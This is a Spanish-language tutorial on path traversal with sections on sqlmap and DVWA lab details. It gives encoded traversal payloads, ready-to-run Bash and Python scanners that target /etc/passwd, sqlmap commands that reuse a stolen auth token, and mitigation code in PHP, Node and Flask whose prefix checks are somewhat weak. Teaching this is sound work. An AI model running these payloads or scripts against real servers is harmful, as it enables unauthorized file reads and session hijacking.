# Guía de Path Traversal y Seguridad Web

## Índice

1. [Introducción](#introducción)
2. [¿Qué es Path Traversal?](#qué-es-path-traversal)
3. [Vectores de Ataque](#vectores-de-ataque)
4. [Ejemplos de Explotación](#ejemplos-de-explotación)

   * Script Bash
   * Scanner en Python
5. [Prevención y Mitigación](#prevención-y-mitigación)

   * PHP
   * Node.js (Express)
   * Python (Flask)
6. [Técnicas Avanzadas y Payloads Extra](#técnicas-avanzadas-y-payloads-extra)
7. [Uso de sqlmap con localStorage/sessionStorage](#uso-de-sqlmap)
8. [Orden de Cookies (DVWA)](#orden-de-cookies)
9. [Detalles de la Query String](#detalles-de-la-query-string)
10. [Referencias](#referencias)

---

## 1. Introducción

El **path traversal** (o *directory traversal*) es una vulnerabilidad que permite a un atacante leer o incluir archivos fuera del directorio permitido por la aplicación. Está en el OWASP Top 10 como A01:2021 – Broken Access Control.

## 2. ¿Qué es Path Traversal?

Cuando una aplicación construye rutas a archivos usando entradas de usuario sin validarlas ni normalizarlas, un atacante puede inyectar `../` (en UNIX) o `..\` (en Windows) para "subir" en la jerarquía de carpetas.

```http
GET /vulnerable.php?file=../../../../etc/passwd HTTP/1.1
```

Este ataque expone información sensible, como `/etc/passwd`, o permite sobrescribir archivos.

## 3. Vectores de Ataque

* **Slash normal**: `../../etc/passwd`
* **URL-encoded**: `%2e%2e%2f%2e%2e%2fetc/passwd`
* **Barras invertidas (Windows)**: `..\\..\\windows\\system32\\drivers\\etc\\hosts`
* **Null byte**: `../../etc/passwd%00.jpg`
* **Overlong UTF-8**: `%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd`
* **Doble codificación**: `%252e%252e%252f%252e%252e%252fetc/passwd`
* **Separadores mixtos**: `..\/..\/etc/passwd`
* **Rutas absolutas disfrazadas**: `././././etc/passwd`
* **Parameter pollution**: `?file=good.html&file=../../etc/passwd`
* **Zip Slip**: entradas ZIP con `../../evil.sh`

## 4. Ejemplos de Explotación

### Script Bash

```bash
#!/usr/bin/env bash
TARGET="https://victima.com/descarga.php?file="
PAYLOADS=(
  "../../etc/passwd"
  "%2e%2e%2f%2e%2e%2fetc/passwd"
  "..\\..\\windows\\system32\\win.ini"
  "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd"
)

for p in "${PAYLOADS[@]}"; do
  url="${TARGET}${p}"
  echo -n "Probando $p → "
  code=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  if [ "$code" -eq 200 ]; then
    echo "¡ÉXITO!"
    curl -s "$url" | head -n 10
    break
  else
    echo "Falló ($code)"
  fi
done
```

### Scanner en Python

```python
import requests

base = "https://victima.com/descarga.php"
param = "file"
for depth in range(1, 11):
    payload = "../" * depth + "etc/passwd"
    r = requests.get(base, params={param: payload})
    if r.status_code == 200 and "root:" in r.text:
        print(f"[+] Vulnerable con {depth} niveles: {r.url}")
        print(r.text.splitlines()[:5])
        break
    else:
        print(f"[-] {depth} niveles → {r.status_code}")
```

## 5. Prevención y Mitigación

### PHP

```php
<?php
function safeInclude($baseDir, $userInput) {
    $file = realpath($baseDir . DIRECTORY_SEPARATOR . $userInput);
    if ($file === false || strpos($file, $baseDir) !== 0) {
        http_response_code(403);
        die('Acceso denegado');
    }
    include $file;
}

safeInclude('/var/www/html/templates', $_GET['tpl']);
?>
```

### Node.js (Express)

```javascript
const express = require('express');
const path = require('path');
const app = express();
const BASE_DIR = path.join(__dirname, 'public');

app.get('/download', (req, res) => {
  const file = req.query.file;
  const filePath = path.normalize(path.join(BASE_DIR, file));
  if (!filePath.startsWith(BASE_DIR)) {
    return res.status(403).send('Access denied');
  }
  res.sendFile(filePath, err => {
    if (err) res.status(404).send('Not found');
  });
});

app.listen(3000);
```

### Python (Flask)

```python
from flask import Flask, abort, send_from_directory
import os

app = Flask(__name__)
BASE_DIR = '/var/www/files'

@app.route('/files/<path:filename>')
def serve_file(filename):
    safe_path = os.path.normpath(os.path.join(BASE_DIR, filename))
    if not safe_path.startswith(os.path.abspath(BASE_DIR)):
        abort(403)
    return send_from_directory(BASE_DIR, filename)

app.run()
```

## 6. Técnicas Avanzadas y Payloads Extra

* Null byte: `../../etc/passwd%00.jpg`
* Doble codificación: `%252e%252e%252f%252e%252e%252fetc/passwd`
* Unicode dotless: usar `U+FF0E` en lugar de `.`
* UNC paths en Windows: `\\127.0.0.1\c$\windows\system32\config\SAM`
* Bypass de check de extensión: `../../passwd.ny` o `../../passwd%2e`

## 7. Uso de sqlmap

* Extrae valor: `token = localStorage.getItem('authToken')`
* Inyéctalo como cookie:

  ```bash
  sqlmap -u "https://victima.com/vuln.php?id=1" --cookie="authToken=$token" -p id
  ```
* O como header:

  ```bash
  sqlmap -u "https://victima.com/vuln.php?id=1" --headers="Authorization: Bearer $token" -p id
  ```
* O en URL GET/POST: `?sess=$sessionValue`

## 8. Orden de Cookies

En DVWA:

```http
Cookie: PHPSESSID=abcd1234; security=low
```

Primero `PHPSESSID`, luego `security=low`.

## 9. Detalles de la Query String

```http
/vulnerabilities/sqli/?id=1&Submit=Submit#
```

* `?id=1`: parámetro de inyección
* `&Submit=Submit`: simula botón de envío
* `#`: fragmento de página (no enviado al servidor)

## 10. Referencias

* OWASP Top Ten: [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
* Wikipedia: [https://es.wikipedia.org/wiki/Path\_traversal](https://es.wikipedia.org/wiki/Path_traversal)
* sqlmap: [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
* Snyk Security: [https://security.snyk.io/](https://security.snyk.io/)


***
sualba.dev © 2025 Todos los derechos reservados
